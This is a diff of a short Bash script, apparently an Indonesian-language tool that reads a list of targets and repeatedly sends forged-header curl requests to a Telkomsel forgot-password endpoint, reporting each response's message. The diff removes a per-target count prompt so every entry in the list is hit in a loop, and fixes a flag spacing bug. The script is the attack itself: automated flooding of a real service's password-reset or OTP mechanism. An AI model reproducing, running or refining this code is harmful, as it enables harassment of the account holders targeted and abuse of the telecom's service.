@@ -42,16 +42,13 @@ function rol1(){
 	                     read -p "list here :" asu
 	                     ceklist
               for x in $(cat $asu); do
-              echo -n "jumlah :"; read jum
-              if [[ $jum == $(seq $jum) ]]; then
-              	 rol
-              fi
+              rol
               done
 	                   c=$(curl -s $R --data $D \
 	         -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" \
              -H "Accept-Language: en-US,en;q=0.5" \
              -H "Referer: https://roli.telkomsel.com/auth/forgot_password" \
-             -H $H--compressed | grep -Po '(?<="message":)[^,]*')
+             -H $H --compressed | grep -Po '(?<="message":)[^,]*')
 }
 rol1;printf "STATUS:$c \n"
 function agr() { if [[ -z $(command -v "curl") ]];then echo "belom dinstall!";fi }
